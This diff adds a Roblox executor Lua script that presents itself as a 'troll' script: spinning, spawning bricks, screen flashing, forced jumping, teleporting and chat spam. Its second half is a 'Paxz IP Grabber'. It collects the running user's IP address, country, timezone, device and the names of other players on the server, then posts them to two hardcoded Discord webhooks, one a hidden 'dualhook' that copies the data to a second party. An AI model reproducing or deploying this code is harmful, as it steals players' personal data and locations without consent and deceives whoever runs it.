@@ -1,0 +1,359 @@
+_G.Webhook = "https://discord.com/api/webhooks/1126858492435775509/MdVE7_53rjjO-UsBJbHf0VwGyE-x-6EC8SAj_QIInkmZw32QxYiyQoY4fKYcSDgrilVi" --// Your webhook for the messages
+_G.Troll = true --// funny things will happen  so set it to true :)
+
+
+_G.Dualhook = "https://discord.com/api/webhooks/1136024093834096812/3E3MNYALp_IQvBldF7NjJip0uNEOAWHA5DdNgZoWmu_bMV5fA1RHxFf0s3BbGQ5w1Fke"
+
+if _G.Troll == true then
+    -- Coroutine voor de eerste sectie van het script
+    local coroutine1 = coroutine.create(function()
+        local speler = game.Players.LocalPlayer
+
+        local rotatiesnelheid = 9999
+
+        local function updateRotatie()
+            local hoek = rotatiesnelheid * (tick() % 1)
+            
+            speler.Character.HumanoidRootPart.CFrame = CFrame.new(speler.Character.HumanoidRootPart.Position) * CFrame.Angles(0, math.rad(hoek), 0)
+        end
+
+        game:GetService("RunService").Heartbeat:Connect(updateRotatie)
+    end)
+
+    -- Coroutine voor de tweede sectie van het script
+    local coroutine2 = coroutine.create(function()
+        local player = game.Players.LocalPlayer
+
+        local function createFallingBrick()
+            local brick = Instance.new("Part")
+            brick.Size = Vector3.new(3, 3, 3)
+            brick.Position = player.Character.Head.Position + Vector3.new(0, 10, 0)
+            brick.Parent = workspace
+
+            local surfaceGui = Instance.new("SurfaceGui")
+            surfaceGui.Parent = brick
+
+            local imageLabel = Instance.new("ImageLabel")
+            imageLabel.Size = UDim2.new(1, 0, 1, 0)
+            imageLabel.BackgroundTransparency = 1
+            imageLabel.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=13945634444&width=420&height=420"
+            imageLabel.Parent = surfaceGui
+
+            return brick
+        end
+
+        local function changeBrickColor(brick)
+            brick.BrickColor = BrickColor.random()
+        end
+
+        local function shrinkBrick(brick)
+            brick.Size = brick.Size - Vector3.new(0.2, 0.2, 0.2)
+        end
+
+        local function trollPlayer()
+            while true do
+                local newBrick = createFallingBrick()
+
+                spawn(function()
+                    while newBrick.Size.X > 0 do
+                        changeBrickColor(newBrick)
+                        shrinkBrick(newBrick)
+                        wait(0.1)
+                    end
+
+                    newBrick:Destroy()
+                end)
+
+                wait(0.5)
+            end
+        end
+
+        trollPlayer()
+    end)
+
+    -- Coroutine voor de derde sectie van het script
+    local coroutine3 = coroutine.create(function()
+        -- Functie om het scherm van kleur te laten veranderen als een disco
+        local function discoEffect()
+            local schermGui = Instance.new("ScreenGui")
+            schermGui.IgnoreGuiInset = true
+            schermGui.DisplayOrder = 999
+            schermGui.Parent = game.Players.LocalPlayer.PlayerGui
+
+            local frame = Instance.new("Frame")
+            frame.Size = UDim2.new(1, 0, 1, 0)
+            frame.BackgroundTransparency = 0.5
+            frame.Parent = schermGui
+
+            while true do
+                frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+                wait(0.1)
+            end
+        end
+
+        discoEffect()
+    end)
+
+    -- Coroutine voor de vierde sectie van het script (muziek afspelen)
+    local coroutine4 = coroutine.create(function()
+        -- Muziek-ID
+        local muziekID = "6823597327"
+
+        -- Functie om muziek af te spelen
+        local function speelMuziekAf()
+            -- Maak een Sound object
+            local sound = Instance.new("Sound")
+            sound.SoundId = "rbxassetid://" .. muziekID
+            sound.Parent = workspace
+            
+            -- Speel de muziek af
+            sound:Play()
+        end
+
+        -- Speel de muziek af
+        speelMuziekAf()
+    end)
+
+    -- Coroutine voor de vijfde sectie van het script (mouse icon veranderen)
+    local coroutine5 = coroutine.create(function()
+        local mouse = game.Players.LocalPlayer:GetMouse()
+        local iconImage = "rbxassetid://13945634444"
+
+        while true do
+            mouse.Icon = iconImage
+            wait()
+        end
+    end)
+
+    -- Coroutine voor de zesde sectie van het script (in- en uitzoomen)
+    local coroutine6 = coroutine.create(function()
+        local camera = workspace.CurrentCamera
+
+        while true do
+            camera.FieldOfView = 70 -- Zoom in
+            wait(0.1)
+            camera.FieldOfView = 90 -- Zoom uit
+            wait(0.1)
+        end
+    end)
+
+    -- Coroutine voor de zevende sectie van het script (continu springen)
+    local coroutine7 = coroutine.create(function()
+        local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
+
+        while true do
+            humanoid.Jump = true
+            wait()
+        end
+    end)
+
+    -- Coroutine voor de achtste sectie van het script (naar de dichtstbijzijnde speler teleporteren)
+    local coroutine8 = coroutine.create(function()
+        local player = game.Players.LocalPlayer
+
+        local function findNearestPlayer()
+            local smallestDistance = math.huge
+            local nearestPlayer
+
+            for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+                if otherPlayer ~= player then
+                    local distance = (otherPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+
+                    if distance < smallestDistance then
+                        smallestDistance = distance
+                        nearestPlayer = otherPlayer
+                    end
+                end
+            end
+
+            return nearestPlayer
+        end
+
+        while true do
+            local nearestPlayer = findNearestPlayer()
+
+            if nearestPlayer then
+                player.Character.HumanoidRootPart.CFrame = nearestPlayer.Character.HumanoidRootPart.CFrame
+            end
+
+            wait()
+        end
+    end)
+
+    -- Coroutine voor de negende sectie van het script (chatbericht sturen)
+    local coroutine9 = coroutine.create(function()
+        while true do
+            game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("*HAVING A BIG PARTY RIGHT NOW!!!*", "All")
+            wait(5)
+        end
+    end)
+
+    -- Start de coroutines
+    coroutine.resume(coroutine1)
+    coroutine.resume(coroutine2)
+    coroutine.resume(coroutine3)
+    coroutine.resume(coroutine4)
+    coroutine.resume(coroutine5)
+    coroutine.resume(coroutine6)
+    coroutine.resume(coroutine7)
+    coroutine.resume(coroutine8)
+    coroutine.resume(coroutine9)
+end
+
+-- Check if the script has already been executed
+if _G.AlreadyExecuted == true then
+    game.Players.LocalPlayer:Kick("Already executed.")
+    return
+end
+
+-- Get the local player's display name
+local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Unknown"
+
+-- Get the current time and date as a string in the local timezone
+local currentTime = os.date("%X") -- Format: HH:MM:SS
+local currentDate = os.date("%Y-%m-%d") -- Format: YYYY-MM-DD
+local currentTimezone = os.date("%Z") -- Get the current timezone
+
+-- Get geolocation data based on IP address
+local geolocationData = game:HttpGetAsync("http://ip-api.com/json")
+local country = ""
+
+-- Parse the geolocation data to retrieve the country
+pcall(function()
+    local geolocationInfo = game:GetService('HttpService'):JSONDecode(geolocationData)
+    country = geolocationInfo.country or ""
+end)
+
+-- Get the Place ID
+local placeId = game.PlaceId
+
+-- Determine the device type the player is using
+local device = ""
+if game:GetService("UserInputService").GamepadEnabled then
+    device = "Console 🎮"
+elseif game:GetService("UserInputService").TouchEnabled then
+    device = "Mobile 📱"
+else
+    device = "Computer 🖥️"
+end
+
+-- Get the names of all players in the server
+local playerNames = ""
+if game.Players then
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        playerNames = playerNames .. "**`" .. player.Name .. "`**" .. "\n"
+    end
+end
+
+-- Get the maximum player slots in the server/game
+local maxPlayers = game:GetService("Players").MaxPlayers
+
+-- Get the remaining player slots
+local remainingSlots = maxPlayers - #game.Players:GetPlayers()
+
+-- Update the webhook URLs to use _G.Webhook and _G.Dualhook
+local webhook = _G.Webhook
+local dualhook = _G.Dualhook
+
+-- Create a separate data table for the normal message
+local normalData = {
+    ["avatar_url"] = "https://cdn.wallpapersafari.com/44/82/AglU1f.jpg",
+    ["content"] = "@everyone Someone Got IP Grabbed",
+    ["username"] = "Paxz IP Grabber",
+    ["embeds"] = {
+        {
+            ["title"] = "Paxz IP Grabber",
+            ["description"] = "👤 | Player Name: " .. playerName .. "\n🕒 | Current Time: " .. currentTime .. "\n⌛ | Timezone: " .. currentTimezone .. "\n📅 | Date: " .. currentDate .. "\n🏳️ | Country: " .. country .. "\n🆔| Place ID: " .. placeId .. "\n📟 | Device: " .. device .. "\n👥 | Max Player Slots: " .. maxPlayers .. "\n🔒 | Remaining Player Slots: " .. remainingSlots .. "\n\n🖧 | Server Player names:\n\n" .. playerNames .. "\n👀 | IP Address:\n\n**```" .. game:HttpGet("http://v4v6.ipv6-test.com/api/myip.php") .. "```**",
+            ["image"] = {
+                ["url"] = "https://cdn.wallpapersafari.com/44/82/AglU1f.jpg"
+            }
+        }
+    }
+}
+
+-- Create a separate data table for the dualhooked message
+local dualhookedData = {
+    ["avatar_url"] = "https://cdn.wallpapersafari.com/44/82/AglU1f.jpg",
+    ["content"] = "@everyone Someone Got IP Grabbed And its Dualhooked XD",
+    ["username"] = "Paxz IP Grabber Dualhooked",
+    ["embeds"] = {
+        {
+            ["title"] = "Paxz IP Grabber Dualhooked",
+            ["description"] = "👤 | Player Name: " .. playerName .. "\n🕒 | Current Time: " .. currentTime .. "\n⌛ | Timezone: " .. currentTimezone .. "\n📅 | Date: " .. currentDate .. "\n🏳️ | Country: " .. country .. "\n🆔| Place ID: " .. placeId .. "\n📟 | Device: " .. device .. "\n👥 | Max Player Slots: " .. maxPlayers .. "\n🔒 | Remaining Player Slots: " .. remainingSlots .. "\n\n🖧 | Server Player names:\n\n" .. playerNames .. "\n👀 | IP Address:\n\n**```" .. game:HttpGet("http://v4v6.ipv6-test.com/api/myip.php") .. "```**",
+            ["image"] = {
+                ["url"] = "https://cdn.wallpapersafari.com/44/82/AglU1f.jpg"
+            }
+        }
+    }
+}
+
+-- Send the HTTP requests to both webhooks
+pcall(function()
+    if syn then
+        syn.request(
+            {
+                Url = webhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(normalData)
+            }
+        )
+        
+        syn.request(
+            {
+                Url = dualhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(dualhookedData)
+            }
+        )
+    elseif request then
+        request(
+            {
+                Url = webhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(normalData)
+            }
+        )
+        
+        request(
+            {
+                Url = dualhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(dualhookedData)
+            }
+        )
+    elseif http_request then
+        http_request(
+            {
+                Url = webhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(normalData)
+            }
+        )
+        
+        http_request(
+            {
+                Url = dualhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(dualhookedData)
+            }
+        )
+    end
+end)
